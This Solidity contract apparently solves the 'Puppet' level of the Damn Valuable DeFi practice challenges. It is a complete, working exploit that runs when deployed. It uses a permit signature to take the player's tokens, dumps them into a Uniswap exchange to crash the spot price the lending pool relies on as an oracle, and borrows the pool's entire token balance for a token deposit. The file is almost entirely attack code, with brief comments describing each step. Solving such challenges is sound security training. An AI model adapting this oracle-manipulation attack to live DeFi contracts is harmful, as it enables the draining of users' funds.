// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./PuppetPool.sol";

interface IUniswapExchange {
    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256);

    function ethToTokenSwapOutput(
        uint256 tokens_bought,
        uint256 deadline
    ) external returns (uint256);
}

contract PuppetAttacker {
    constructor(
        DamnValuableToken token,
        PuppetPool puppetPool,
        IUniswapExchange uniswapExchange,
        uint256 playerInitialBalance,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) payable {
        // EIP-2612 - permit allows attacker contract to spend token, using r,s, v signature components
        token.permit(
            msg.sender,
            address(this),
            playerInitialBalance,
            deadline,
            v,
            r,
            s
        );

        token.transferFrom(msg.sender, address(this), playerInitialBalance);

        // swap DVT against eth to manipulate oracle price
        token.approve(address(uniswapExchange), playerInitialBalance);
        uniswapExchange.tokenToEthSwapInput(1000 ether, 1, block.timestamp + 1);

        // Now we can borrow the whole amount of the lending pool
        uint256 depositRequired = puppetPool.calculateDepositRequired(
            token.balanceOf(address(puppetPool))
        );

        puppetPool.borrow{value: depositRequired}(
            token.balanceOf(address(puppetPool)),
            msg.sender
        );
    }

    receive() external payable {}
}
